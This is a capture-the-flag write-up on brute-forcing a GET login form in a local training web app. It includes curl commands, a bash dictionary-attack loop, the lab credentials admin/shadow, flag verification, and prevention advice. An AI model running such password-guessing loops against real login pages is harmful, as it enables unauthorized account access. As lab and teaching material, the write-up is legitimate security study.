# Bruteforce (member)

## 1. Discovery

The login form is available at `?page=signin`. It uses a GET request, so the login values are sent in the URL. The form fields are `username` and `password`. Test how the page responds to an invalid password, then compare that response with a valid login.

The existing candidate list is `mandatory/bruteforce/Resources/passwords.txt`. It contains 20 entries. It does not contain the verified password `shadow`.

## 2. Exploitation

Send a test password with the GET form. Inspect the response body for the page's failure behavior:

```bash
curl -sG \
--data-urlencode 'username=admin' \
--data-urlencode 'password=wrong-password' \
--data-urlencode 'Login=Login' \
"http://127.0.0.1:8080/?page=signin"
```

No exact failure message is assumed. Use the response to the test password as a baseline. The candidate loop below treats only the known success marker `Good Job` as a valid password; other responses are unsuccessful candidates. It prints a candidate only when it finds that marker:

```bash
while IFS= read -r candidate; do
  response=$(curl -sG \
    --data-urlencode 'username=admin' \
    --data-urlencode "password=$candidate" \
    --data-urlencode 'Login=Login' \
    "http://127.0.0.1:8080/?page=signin")
  if printf '%s' "$response" | grep -q 'Good Job'; then
    printf 'Accepted candidate: %s\n' "$candidate"
    break
  fi
done < mandatory/bruteforce/Resources/passwords.txt
```

The current list does not include `shadow`, so it does not find the verified password. The loop shows the dictionary attack method; it was not the source of the verified password.

Use the verified credentials to log in:

```bash
curl -sG \
--data-urlencode 'username=admin' \
--data-urlencode 'password=shadow' \
--data-urlencode 'Login=Login' \
"http://127.0.0.1:8080/?page=signin" \
| grep "Good Job"
```

Observed result: the verified credentials `admin / shadow` return the challenge flag.

## 3. Technical Explanation

The form sends the username and password as GET parameters. A dictionary attack sends candidate passwords for a username and checks each response for a success indicator, such as the challenge flag. The `passwords.txt` file is available as a candidate list, but it does not contain `shadow`. The verified password was not found by that initial list. The successful login was confirmed separately with `admin / shadow`.

The commands show that the verified credentials return the flag. They do not establish how the application stores passwords or what exact check it uses for a failed password. Rate limiting was not tested.

## 4. Security Impact

If an attacker can make repeated login attempts and the application does not limit or detect them, the attacker can test many password guesses. A successful guess can expose the account and its protected data or functions. This is a risk of weak login protections; this evaluation does not establish whether the application has rate limits.

## 5. Prevention

Use strong, unique passwords and store them with a modern password hashing function designed for passwords, with a unique salt. Limit repeated login attempts and add monitoring for unusual failures. Use multi-factor authentication for sensitive accounts. Send credentials in a POST request over HTTPS instead of putting them in the URL, because URLs can appear in browser history, logs, and other records. Return a generic login error that does not reveal which field was incorrect.

## 6. Flag Verification

Run the command from the repository root. It sends the verified login, matches the response's `The flag is :` text, extracts that value, and compares it with `mandatory/bruteforce/flag`:

```bash
curl -sG \
--data-urlencode 'username=admin' \
--data-urlencode 'password=shadow' \
--data-urlencode 'Login=Login' \
"http://127.0.0.1:8080/?page=signin" \
| grep -oE 'The flag is : [a-f0-9]{64}' \
| grep -oE '[a-f0-9]{64}' \
| diff - mandatory/bruteforce/flag
```

An exit status of `0` means that the retrieved flag matches the saved flag. The address `127.0.0.1:8080` is our local VirtualBox port-forwarding address. Adjust it if the evaluation environment uses a different address or port.
